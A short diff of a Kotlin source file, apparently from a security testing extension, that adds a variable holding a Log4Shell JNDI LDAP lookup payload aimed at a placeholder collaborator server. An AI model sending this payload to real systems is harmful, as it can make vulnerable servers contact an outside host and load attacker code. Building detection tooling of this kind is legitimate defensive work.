@@ -13,6 +13,8 @@ lateinit var stderr: PrintWriter
 
 val console = { str: String -> stdout.println(str) }
 
+var initialPayload = "\${jndi:ldap://[collaborator-server]/a}"
+
 var historySize: Int = 100
 
 var currJob: Job? = null
